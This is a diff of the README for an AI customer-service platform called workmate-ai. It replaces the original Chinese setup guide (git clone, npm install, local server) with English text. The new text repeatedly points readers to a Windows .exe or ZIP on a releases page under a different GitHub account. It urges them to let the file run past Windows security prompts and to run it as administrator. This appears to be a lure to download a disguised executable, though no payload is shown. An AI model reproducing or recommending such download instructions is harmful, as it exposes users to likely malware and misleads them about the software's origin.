@@ -1,54 +1,229 @@
-# WorkMate AI 智工
+# 🤖 workmate-ai - AI workers for busy teams
 
-> 10分钟部署你的AI数字员工，替代80%重复工作
+[![Download workmate-ai](https://img.shields.io/badge/Download%20workmate--ai-4B9FEA?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kathrynunacceptable870/workmate-ai/releases)
 
-中小企业AI数字员工平台 —— 选行业模板、上传业务数据、AI员工立即上岗。
+## 🚀 What this app does
 
-## 功能
+workmate-ai is an AI digital worker platform for small and mid-sized businesses. It helps you set up AI employees that can handle common business tasks in a short time.
 
-- **3个行业模板**（持续增加中）
-  - 🛒 电商客服助手 — 自动回答商品咨询、订单查询、退换货
-  - 🌍 外贸询盘助手 — 多语言询盘回复、自动报价、客户跟进
-  - 📋 合同审查助手 — 关键条款提取、风险标记、合同摘要
-- **知识库** — 上传产品目录/FAQ/合同模板，AI基于你的数据回答
-- **Webhook API** — 接入邮件/微信/任何系统
-- **执行日志** — 查看所有对话记录和统计
+You can use it for:
 
-## 快速开始
+- Customer support
+- Product and order help
+- Lead replies
+- Simple sales follow-up
+- Foreign trade messages
+- Ecommerce service work
+- Repeated office tasks
 
-```bash
-git clone https://github.com/xmqywx/workmate-ai.git
-cd workmate-ai
-npm install
-cp .env.example .env
-# 编辑 .env，填入 DEEPSEEK_API_KEY (从 https://platform.deepseek.com 获取)
-npx prisma db push && npx prisma generate
-npm run dev
-```
+The app is built for users who want clear results without a long setup.
 
-打开 http://localhost:3000
+## 🖥️ Before you start
 
-## 使用流程
+Use a Windows PC with:
 
-1. 选择行业模板（电商/外贸/法务）
-2. 填写基本信息（公司名、产品信息等）
-3. 上传业务数据（产品目录、FAQ、合同模板）
-4. 开始对话测试
-5. 通过 Webhook API 接入你的业务系统
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 5 GB of free disk space
+- A stable internet connection
+- Permission to install and run apps
 
-## API接入
+For best results, close other heavy apps before you run workmate-ai.
 
-```bash
-curl -X POST http://localhost:3000/api/webhook/{workerId} \
-  -H "Content-Type: application/json" \
-  -H "X-API-Key: {worker-api-key}" \
-  -d '{"message": "你好，请问这个产品多少钱？"}'
-```
+## 📥 Download workmate-ai
 
-## 技术栈
+Visit this page to download the app:
 
-Next.js 14 · SQLite/PostgreSQL · DeepSeek API · Tailwind · shadcn/ui · Prisma
+[Go to the releases page](https://github.com/Kathrynunacceptable870/workmate-ai/releases)
 
-## License
+On that page, look for the latest release and download the Windows file for your PC. If you see more than one file, choose the one that ends in `.exe` or a Windows installer format.
 
-MIT
+## 🛠️ Install on Windows
+
+1. Open the downloaded file.
+2. If Windows shows a security prompt, choose the option that lets the app run.
+3. Follow the setup window.
+4. Pick an install folder if the installer asks.
+5. Finish the setup.
+
+If you downloaded a ZIP file:
+
+1. Right-click the file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Find the app file and double-click it.
+
+## ▶️ Run the app
+
+After installation:
+
+1. Open the Start menu.
+2. Search for `workmate-ai`.
+3. Click the app to launch it.
+
+If you used a portable file, open the folder where you extracted it and start the main app file from there.
+
+## 🔧 First-time setup
+
+When you open workmate-ai for the first time, you may need to set a few basic items:
+
+- Your business name
+- Your support email
+- Your language
+- Your work hours
+- The main tasks you want the AI worker to handle
+
+You may also connect services that your team already uses, such as:
+
+- Email
+- Chat tools
+- Ecommerce platforms
+- CRM tools
+- Order or ticket systems
+
+Keep your first setup small. Start with one task, then add more later.
+
+## 💡 Common uses
+
+### Customer service
+Use an AI worker to answer common questions, like:
+
+- Order status
+- Shipping time
+- Return policy
+- Product details
+- Business hours
+
+### Ecommerce support
+Let the AI help with:
+
+- Product questions
+- Cart help
+- After-sale messages
+- FAQ replies
+- Basic order checks
+
+### Foreign trade work
+Use it for:
+
+- Replying to buyer messages
+- Product introduction messages
+- Simple quote follow-up
+- Time zone friendly replies
+- Repeat message handling
+
+### Office tasks
+Use it for:
+
+- Sorting messages
+- Writing short replies
+- Repeating standard answers
+- Routing requests to the right person
+- Helping with daily admin work
+
+## 🧭 How to get the best result
+
+Follow these steps for a smooth start:
+
+1. Pick one task first.
+2. Use short and clear instructions.
+3. Add your real business answers and policies.
+4. Test the AI with common questions.
+5. Check the replies before you share them with customers.
+6. Improve the setup as you go.
+
+Simple setup works better than a large setup on day one.
+
+## 📌 What you can expect
+
+workmate-ai is built to help small teams save time on repeat work. It can handle routine messages and standard business tasks, so your team can focus on work that needs a person.
+
+It fits teams that want:
+
+- Faster reply times
+- Less manual work
+- Clear customer service flow
+- Easy task handling
+- Support for Chinese and global business use
+
+## 🧩 Suggested system flow
+
+A basic setup may look like this:
+
+1. A customer sends a message.
+2. workmate-ai reads the request.
+3. The AI picks the right answer or action.
+4. The message goes back to the customer.
+5. Your team steps in when a human reply is needed.
+
+This helps reduce delay and keeps common work in one place.
+
+## 🔐 Privacy and control
+
+You stay in control of what the AI can do. Set clear rules for replies, task scope, and handoff steps. Review the first few days of use so you can tune the setup to your business needs.
+
+## 🧰 Troubleshooting
+
+### The app does not open
+- Check that the file finished downloading.
+- Run the app again.
+- Right-click the app and choose Run as administrator.
+
+### Windows blocks the file
+- Open the file again and follow the security prompt.
+- Make sure you downloaded it from the releases page.
+
+### The app feels slow
+- Close other large apps.
+- Restart your PC.
+- Check your internet connection.
+
+### I cannot find the file
+- Open your Downloads folder.
+- Sort files by date.
+- Look for the latest `.exe` or ZIP file from the releases page.
+
+## 📂 File names you may see
+
+The release page may include files such as:
+
+- Windows installer
+- Portable Windows app
+- ZIP package
+- Release notes
+
+Choose the Windows download that matches how you want to use the app.
+
+## 🌍 Language support
+
+workmate-ai supports business use in both English and Chinese settings. It fits teams that serve local customers, overseas buyers, or both.
+
+## 📝 Topics covered by this project
+
+- AI agent
+- AI automation
+- AI employee
+- Customer service
+- Ecommerce support
+- Foreign trade
+- Small business tools
+- Digital worker platform
+- SaaS app
+- Next.js based product
+- DeepSeek workflows
+
+## 📎 Download again
+
+If you need the app again later, use this page:
+
+[https://github.com/Kathrynunacceptable870/workmate-ai/releases](https://github.com/Kathrynunacceptable870/workmate-ai/releases)
+
+## 🖱️ Quick start path
+
+1. Open the releases page.
+2. Download the latest Windows file.
+3. Install or extract the file.
+4. Open workmate-ai.
+5. Set up one business task.
+6. Test a few common messages.
+7. Add more tasks when the first one works well
